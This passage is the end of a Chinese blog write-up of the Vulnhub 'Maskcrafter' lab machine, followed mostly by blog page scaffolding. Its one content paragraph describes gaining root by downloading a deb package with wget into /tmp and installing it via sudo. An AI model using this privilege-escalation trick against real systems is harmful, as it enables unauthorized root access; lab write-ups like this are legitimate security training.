+<p>在靶机中使用<code>wget</code>命令下载<code>deb</code>包（注意先切换到<code>/tmp</code>目录才有写入权限），然后使用<code>sudo</code>以<code>root</code>权限安装该包，成功获取<code>root</code>权限的Shell。</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026165834572.png" alt="image-20201026165834572" style="zoom:50%;">
+
+<p>成功获取<code>flag</code>：</p>
+<img src="/2020/10/26/Vulnhub%E2%80%94Maskcrafter/image-20201026170101890.png" alt="image-20201026170101890" style="zoom:50%;">
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">a4ua</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://a4ua.github.io/2020/10/26/Vulnhub%E2%80%94Maskcrafter/">http://a4ua.github.io/2020/10/26/Vulnhub%E2%80%94Maskcrafter/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">a4ua</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tagsio/Vulnhub/">
+                                    <span class="chip bg-color">Vulnhub</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'lE2fTHGggXYwAQMOeCpNVfef-gzGzoHsz',
+        appKey: '0wd5OTGOTsbq0UF9Rx3FHmQu',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/10/27/Server-side-template-injection/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Server-side template injection">
+                        
+                        <span class="card-title">Server-side template injection</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tagsio/SSTI/">
+                        <span class="chip bg-color">SSTI</span>
+                    </a>
+                    
+                    <a href="/tagsio/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">漏洞学习</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/10/20/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94Context/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Golang学习之路—Context">
+                        
+                        <span class="card-title">Golang学习之路—Context</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Golang/" class="post-category">
+                                    Golang
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tagsio/Go%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+                        <span class="chip bg-color">Go基础知识</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2020</span>
+            <a href="/about" target="_blank">a4ua</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">25.1k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "09";
+                    var startDate = "21";
+                    var startHour = "21";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/a4ua" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <!-- <script async src="/libs/others/busuanzi.pure.mini.js"></script> -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
